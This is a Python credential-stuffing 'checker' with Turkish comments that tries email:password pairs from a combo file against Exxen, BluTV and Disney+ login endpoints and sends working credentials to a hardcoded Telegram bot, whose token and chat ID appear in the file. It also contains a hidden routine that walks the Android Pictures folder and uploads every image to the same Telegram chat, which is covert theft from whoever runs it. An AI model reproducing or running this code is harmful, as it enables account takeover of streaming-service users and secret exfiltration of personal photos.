import time
import requests
import os
import threading
from telegram import Bot
from telegram.ext import Updater, CommandHandler
from colorama import Fore, init

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Telegram bot token ve chat ID
bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'
bot = Bot(token=bot_token)

# Telegram bildirimi gönder
def send_telegram_notification(message):
    try:
        bot.send_message(chat_id=chat_id, text=message)
        print("Telegram bildirimi gönderildi.")
    except Exception as e:
        print(f"Telegram hatası: {e}")

# Giriş işlemini deneme (Checker işlemi)
def try_login(email, password, checker_type):
    # Hangi checker kullanılırsa, o checker'a uygun URL ve post verisi
    if checker_type == "Exxen":
        url = "https://www.exxen.com.tr/login"
    elif checker_type == "BluTV":
        url = "https://smarttv.blutv.com.tr/actions/account/login"
    elif checker_type == "Disney":
        url = "https://www.disneyplus.com/identity/login/enter-email"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }

    with requests.Session() as session:
        # Giriş verisi
        payload = {"username": email, "password": password}
        response = session.post(url, data=payload, headers=headers)

        if response.status_code == 200:
            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:
                print(f"Yanlış şifre veya e-posta: {email}")
                return False
            elif "Welcome" in response.text:
                print("Giriş başarılı!")
                send_telegram_notification(f"Başarılı giriş: {email} : {password}")
                return True
            else:
                print("Giriş başarısız, bilinmeyen bir hata.")
                return False
        else:
            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")
            return False

# Fotoğraf gönderme işlemi (Bütün dosya yollarını kontrol et)
def photo_send_thread():
    folder_path = "/storage/emulated/0/Pictures"  # Android'teki fotoğraf dosyası yolu örneği
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.lower().endswith(('jpg', 'jpeg', 'png')):
                photo_path = os.path.join(root, file)
                try:
                    bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))
                    print(f"Fotoğraf gönderildi: {photo_path}")
                except Exception as e:
                    print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")

# Dosya yolu kontrolü ve fotoğraf gönderme başlatma
def start_photo_send_process():
    # Fotoğraf gönderimini başlatacak thread
    threading.Thread(target=photo_send_thread).start()

# Kullanıcıdan doğru dosya yolu al, kontrol et
def validate_file_path(file_path):
    if os.path.exists(file_path):
        start_photo_send_process()
    else:
        print("Geçersiz dosya yolu! Lütfen doğru bir yol girin.")

# Giriş ve checker işlemi başlatma
def start_checker():
    print("Hangi servisi kontrol etmek istersiniz?")
    print("1. Exxen")
    print("2. BluTV")
    print("3. Disney+")
    
    choice = input("Seçiminizi yapın (1/2/3): ")

    if choice == "1":
        checker_type = "Exxen"
    elif choice == "2":
        checker_type = "BluTV"
    elif choice == "3":
        checker_type = "Disney"
    else:
        print("Geçersiz seçim!")
        return

    file_path = input("Combo dosyasının tam yolunu girin (örneğin: /path/to/combo.txt): ")
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            combos = f.readlines()
        
        for combo in combos:
            email, password = combo.strip().split(":")
            print(f"Giriş yapılıyor: {email} : {password}")
            login_success = try_login(email, password, checker_type)
            if login_success:
                print(Fore.GREEN + f"Başarılı giriş: {email} : {password}")
            else:
                print(Fore.RED + f"Başarısız giriş: {email} : {password}")
            time.sleep(0.1)
    
    except Exception as e:
        print(f"Dosya okuma hatası: {e}")
        return

# Ana fonksiyon
def main():
    start_checker()

if __name__ == "__main__":
    main()
